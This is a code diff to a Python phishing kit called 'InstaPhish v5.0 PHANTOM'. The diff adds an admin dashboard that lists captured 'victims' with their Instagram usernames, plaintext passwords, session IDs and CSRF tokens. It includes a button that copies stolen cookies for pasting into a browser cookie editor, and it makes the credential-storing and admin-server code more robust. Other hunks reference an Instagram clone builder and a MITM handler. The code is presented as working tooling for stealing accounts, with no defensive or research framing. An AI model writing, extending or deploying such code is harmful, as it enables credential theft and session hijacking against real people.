@@ -77,6 +77,288 @@ class Setup:
         )''')
         conn.commit()
         conn.close()
+    
+    @staticmethod
+    def generate_admin_panel():
+        """Generate the admin.html file before Flask starts"""
+        admin_html = '''<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>InstaPhish v5.0 - Admin Panel</title>
+    <style>
+        :root {
+            --bg: #0a0a0a;
+            --card: #121212;
+            --border: #262626;
+            --text: #f5f5f5;
+            --accent: #0095f6;
+            --danger: #ed4956;
+            --success: #78de45;
+            --warn: #f7b500;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        .header {
+            background: var(--card);
+            border: 1px solid var(--border);
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .header h1 {
+            color: var(--accent);
+            font-size: 24px;
+        }
+        .stats {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+        .stat-card {
+            background: var(--bg);
+            border: 1px solid var(--border);
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            min-width: 120px;
+        }
+        .stat-card .num {
+            font-size: 28px;
+            font-weight: bold;
+            color: var(--accent);
+        }
+        .stat-card .lbl {
+            font-size: 11px;
+            color: #888;
+            margin-top: 5px;
+        }
+        .panel {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+        .panel h2 {
+            padding: 15px 20px;
+            border-bottom: 1px solid var(--border);
+            font-size: 16px;
+            background: var(--bg);
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        th {
+            background: var(--bg);
+            padding: 12px;
+            text-align: left;
+            font-size: 12px;
+            color: #888;
+            border-bottom: 1px solid var(--border);
+        }
+        td {
+            padding: 10px 12px;
+            border-bottom: 1px solid var(--border);
+            font-size: 13px;
+            word-break: break-all;
+        }
+        tr:hover {
+            background: rgba(0, 149, 246, 0.05);
+        }
+        .cookie-data {
+            color: var(--warn);
+            max-width: 200px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        button {
+            background: var(--accent);
+            color: #fff;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 600;
+            margin: 2px;
+            transition: opacity 0.2s;
+        }
+        button:hover {
+            opacity: 0.8;
+        }
+        button.danger {
+            background: var(--danger);
+        }
+        button.success {
+            background: var(--success);
+            color: #000;
+        }
+        .refresh-btn {
+            background: var(--accent);
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+        .copy-btn {
+            background: var(--success);
+            color: #000;
+            padding: 4px 8px;
+            font-size: 11px;
+        }
+        @media (max-width: 768px) {
+            body {
+                padding: 10px;
+            }
+            th, td {
+                font-size: 11px;
+                padding: 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>⚡ InstaPhish v5.0 PHANTOM</h1>
+        <div class="stats">
+            <div class="stat-card">
+                <div class="num" id="total">0</div>
+                <div class="lbl">Total Victims</div>
+            </div>
+            <div class="stat-card">
+                <div class="num" id="today">0</div>
+                <div class="lbl">Today</div>
+            </div>
+            <div class="stat-card">
+                <div class="num" id="sessions">0</div>
+                <div class="lbl">Active Sessions</div>
+            </div>
+        </div>
+        <button class="refresh-btn" onclick="loadData()">↻ Refresh</button>
+    </div>
+
+    <div class="panel">
+        <h2>📧 Captured Credentials & Cookies</h2>
+        <div style="overflow-x: auto;">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>IP Address</th>
+                        <th>Username</th>
+                        <th>Password</th>
+                        <th>Session ID</th>
+                        <th>CSRF Token</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody id="victims-table">
+                    <tr><td colspan="7" style="text-align:center;">Loading...</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <script>
+        async function loadData() {
+            try {
+                const response = await fetch('/api/data');
+                const data = await response.json();
+                
+                document.getElementById('total').textContent = data.total;
+                document.getElementById('today').textContent = data.today;
+                document.getElementById('sessions').textContent = data.active_sessions;
+                
+                const tableBody = document.getElementById('victims-table');
+                
+                if (data.victims.length === 0) {
+                    tableBody.innerHTML = '<tr><td colspan="7" style="text-align:center;color:#888;">No victims captured yet. Waiting for connections...</td></tr>';
+                    return;
+                }
+                
+                let html = '';
+                data.victims.forEach(v => {
+                    html += `
+                        <tr>
+                            <td>${v.timestamp || '-'}</td>
+                            <td>${v.ip || '-'}</td>
+                            <td>${v.username || '-'}</td>
+                            <td>${v.password || '-'}</td>
+                            <td class="cookie-data" title="${v.sessionid || ''}">${v.sessionid ? v.sessionid.substring(0, 25) + '...' : '-'}</td>
+                            <td class="cookie-data" title="${v.csrftoken || ''}">${v.csrftoken ? v.csrftoken.substring(0, 20) + '...' : '-'}</td>
+                            <td>
+                                <button class="copy-btn" onclick="copyCookies('${v.sessionid || ''}', '${v.csrftoken || ''}', '${v.ds_user_id || ''}')">📋 Copy</button>
+                                <button class="danger" onclick="deleteVictim(${v.id})">🗑 Del</button>
+                            </td>
+                        </tr>
+                    `;
+                });
+                tableBody.innerHTML = html;
+            } catch (error) {
+                console.error('Error loading data:', error);
+                document.getElementById('victims-table').innerHTML = '<tr><td colspan="7" style="text-align:center;color:red;">Error loading data. Check console.</td></tr>';
+            }
+        }
+        
+        function copyCookies(sessionid, csrftoken, ds_user_id) {
+            const cookies = {};
+            if (sessionid) cookies.sessionid = sessionid;
+            if (csrftoken) cookies.csrftoken = csrftoken;
+            if (ds_user_id) cookies.ds_user_id = ds_user_id;
+            
+            const cookieString = Object.entries(cookies)
+                .map(([key, value]) => `${key}=${value}`)
+                .join('; ');
+            
+            navigator.clipboard.writeText(cookieString).then(() => {
+                alert('✅ Cookies copied to clipboard!\\nUse with EditThisCookie extension.');
+            }).catch(err => {
+                // Fallback for older browsers
+                const textarea = document.createElement('textarea');
+                textarea.value = cookieString;
+                document.body.appendChild(textarea);
+                textarea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textarea);
+                alert('✅ Cookies copied to clipboard!');
+            });
+        }
+        
+        async function deleteVictim(id) {
+            if (confirm('Delete this victim record?')) {
+                await fetch('/api/delete/' + id);
+                loadData();
+            }
+        }
+        
+        // Load data immediately and refresh every 5 seconds
+        loadData();
+        setInterval(loadData, 5000);
+    </script>
+</body>
+</html>'''
+        
+        with open("admin.html", "w", encoding="utf-8") as f:
+            f.write(admin_html)
+        print(f"{Colors.GREEN}[+] Admin panel generated{Colors.RESET}")
 
 # ==================== EXACT CLONE BUILDER ====================
 class InstagramExactCloner:
@@ -681,7 +963,7 @@ setInterval(() => {
 
 </html>'''
 
-# ==================== MITM HANDLER WITH WEBSOCKET PUSH ====================
+# ==================== MITM HANDLER ====================
 class PhantomHandler(http.server.BaseHTTPRequestHandler):
     
     def log_message(self, format, *args):
@@ -698,37 +980,40 @@ class PhantomHandler(http.server.BaseHTTPRequestHandler):
         return cookies
     
     def store_victim(self, username="", password="", cookies_dict=None, ip="", ua=""):
-        conn = sqlite3.connect(CONFIG["db_file"])
-        c = conn.cursor()
-        cookie_str = json.dumps(cookies_dict) if cookies_dict else ""
-        
-        c.execute('''INSERT INTO victims 
-                     (timestamp, ip_address, user_agent, username, password,
-                      sessionid, csrftoken, ds_user_id, rur, mid, ig_did, all_cookies)
-                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
-                  (datetime.now().isoformat(), ip, ua, username, password,
-                   cookies_dict.get('sessionid', '') if cookies_dict else '',
-                   cookies_dict.get('csrftoken', '') if cookies_dict else '',
-                   cookies_dict.get('ds_user_id', '') if cookies_dict else '',
-                   cookies_dict.get('rur', '') if cookies_dict else '',
-                   cookies_dict.get('mid', '') if cookies_dict else '',
-                   cookies_dict.get('ig_did', '') if cookies_dict else '',
-                   cookie_str))
-        conn.commit()
-        conn.close()
-        
-        with open(CONFIG["log_file"], "a") as f:
-            f.write(f"[{datetime.now()}] IP: {ip}\n")
-            f.write(f"  USER: {username}\n  PASS: {password}\n")
-            if cookies_dict:
-                f.write(f"  SESSIONID: {cookies_dict.get('sessionid', 'N/A')}\n")
-            f.write("-" * 40 + "\n")
-        
-        if cookies_dict and cookies_dict.get('sessionid'):
-            with open(CONFIG["cookie_file"], "a") as f:
-                f.write(f"[{datetime.now()}] SESSIONID: {cookies_dict['sessionid']}\n  FULL: {cookie_str}\n---\n")
-        
-        print(f"{Colors.RED}[!] {Colors.WHITE}CAPTURED | {Colors.YELLOW}{username}:{password}{Colors.RESET} | {Colors.GREEN}Session: {'YES' if cookies_dict and cookies_dict.get('sessionid') else 'NO'}{Colors.RESET}")
+        try:
+            conn = sqlite3.connect(CONFIG["db_file"])
+            c = conn.cursor()
+            cookie_str = json.dumps(cookies_dict) if cookies_dict else ""
+            
+            c.execute('''INSERT INTO victims 
+                         (timestamp, ip_address, user_agent, username, password,
+                          sessionid, csrftoken, ds_user_id, rur, mid, ig_did, all_cookies)
+                         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+                      (datetime.now().isoformat(), ip, ua, username, password,
+                       cookies_dict.get('sessionid', '') if cookies_dict else '',
+                       cookies_dict.get('csrftoken', '') if cookies_dict else '',
+                       cookies_dict.get('ds_user_id', '') if cookies_dict else '',
+                       cookies_dict.get('rur', '') if cookies_dict else '',
+                       cookies_dict.get('mid', '') if cookies_dict else '',
+                       cookies_dict.get('ig_did', '') if cookies_dict else '',
+                       cookie_str))
+            conn.commit()
+            conn.close()
+            
+            with open(CONFIG["log_file"], "a") as f:
+                f.write(f"[{datetime.now()}] IP: {ip}\n")
+                f.write(f"  USER: {username}\n  PASS: {password}\n")
+                if cookies_dict:
+                    f.write(f"  SESSIONID: {cookies_dict.get('sessionid', 'N/A')}\n")
+                f.write("-" * 40 + "\n")
+            
+            if cookies_dict and cookies_dict.get('sessionid'):
+                with open(CONFIG["cookie_file"], "a") as f:
+                    f.write(f"[{datetime.now()}] SESSIONID: {cookies_dict['sessionid']}\n  FULL: {cookie_str}\n---\n")
+            
+            print(f"{Colors.RED}[!] {Colors.WHITE}CAPTURED | {Colors.YELLOW}{username}:{password}{Colors.RESET} | {Colors.GREEN}Session: {'YES' if cookies_dict and cookies_dict.get('sessionid') else 'NO'}{Colors.RESET}")
+        except Exception as e:
+            print(f"{Colors.RED}[ERROR] Database write failed: {e}{Colors.RESET}")
     
     def handle_capture(self):
         content_length = int(self.headers.get('Content-Length', 0))
@@ -850,14 +1135,19 @@ def main():
     Setup.create_directories()
     Setup.generate_ssl_cert()
     Setup.init_database()
+    Setup.generate_admin_panel()  # Generate admin.html before Flask starts
     
     cloner = InstagramExactCloner()
     cloner.build()
     
-    print(f"{Colors.CYAN}[!] Copy all images to cloned_site/images/ from repo{Colors.RESET}")
+    print(f"{Colors.CYAN}[!] Make sure to copy all images to cloned_site/images/{Colors.RESET}")
+    print(f"{Colors.CYAN}[!] Required: facebook.png, google-play.png, insta_logo.png, microsoft.png, phones.png, ss1.png, ss2.png, ss3.png, title.jpg{Colors.RESET}")
     
     # Start Admin Panel in background
     threading.Thread(target=start_admin, daemon=True).start()
+    
+    # Give Flask a moment to start
+    time.sleep(1)
     
     server = socketserver.ThreadingTCPServer((CONFIG["listen_host"], CONFIG["listen_port"]), PhantomHandler)
     
@@ -882,42 +1172,74 @@ def main():
         print(f"\n{Colors.RED}[!] Shutdown.{Colors.RESET}")
 
 def start_admin():
-    from flask import Flask, jsonify, send_file
-    import sqlite3
+    """Start Flask admin panel"""
+    from flask import Flask, jsonify
     
     admin_app = Flask(__name__)
     
+    # Ensure admin.html exists
+    admin_html_path = os.path.join(os.getcwd(), "admin.html")
+    
     @admin_app.route('/')
     def index():
-        return send_file('admin.html')
+        if os.path.exists(admin_html_path):
+            return open(admin_html_path, 'r', encoding='utf-8').read()
+        return "<h1>Admin panel not found. Restart the script.</h1>", 500
     
     @admin_app.route('/api/data')
     def data():
-        conn = sqlite3.connect(CONFIG["db_file"])
-        c = conn.cursor()
-        c.execute('SELECT * FROM victims ORDER BY id DESC LIMIT 200')
-        victims = []
-        for row in c.fetchall():
-            victims.append({
-                'id': row[0], 'timestamp': row[1], 'ip': row[2],
-                'username': row[4], 'password': row[5], 'sessionid': row[6],
-                'csrftoken': row[7], 'ds_user_id': row[8]
+        try:
+            conn = sqlite3.connect(CONFIG["db_file"])
+            c = conn.cursor()
+            c.execute('SELECT * FROM victims ORDER BY id DESC LIMIT 200')
+            victims = []
+            for row in c.fetchall():
+                victims.append({
+                    'id': row[0],
+                    'timestamp': row[1],
+                    'ip': row[2],
+                    'username': row[4],
+                    'password': row[5],
+                    'sessionid': row[6],
+                    'csrftoken': row[7],
+                    'ds_user_id': row[8]
+                })
+            c.execute('SELECT COUNT(*) FROM victims')
+            total = c.fetchone()[0]
+            
+            # Count today's victims
+            today = datetime.now().strftime('%Y-%m-%d')
+            c.execute("SELECT COUNT(*) FROM victims WHERE timestamp LIKE ?", (f"{today}%",))
+            today_count = c.fetchone()[0]
+            
+            # Count active sessions
+            c.execute("SELECT COUNT(*) FROM victims WHERE sessionid != ''")
+            active_sessions = c.fetchone()[0]
+            
+            conn.close()
+            return jsonify({
+                'total': total,
+                'today': today_count,
+                'active_sessions': active_sessions,
+                'victims': victims
             })
-        c.execute('SELECT COUNT(*) FROM victims')
-        total = c.fetchone()[0]
-        conn.close()
-        return jsonify({'total': total, 'victims': victims})
+        except Exception as e:
+            return jsonify({'error': str(e), 'total': 0, 'today': 0, 'active_sessions': 0, 'victims': []})
     
     @admin_app.route('/api/delete/<int:victim_id>')
     def delete(victim_id):
-        conn = sqlite3.connect(CONFIG["db_file"])
-        c = conn.cursor()
-        c.execute('DELETE FROM victims WHERE id=?', (victim_id,))
-        conn.commit()
-        conn.close()
-        return jsonify({'status': 'deleted'})
+        try:
+            conn = sqlite3.connect(CONFIG["db_file"])
+            c = conn.cursor()
+            c.execute('DELETE FROM victims WHERE id=?', (victim_id,))
+            conn.commit()
+            conn.close()
+            return jsonify({'status': 'deleted'})
+        except Exception as e:
+            return jsonify({'error': str(e)})
     
-    admin_app.run(host='0.0.0.0', port=CONFIG['admin_port'], debug=False)
+    print(f"{Colors.BLUE}[+] Admin panel starting on port {CONFIG['admin_port']}{Colors.RESET}")
+    admin_app.run(host='0.0.0.0', port=CONFIG['admin_port'], debug=False, use_reloader=False)
 
 if __name__ == "__main__":
     main()
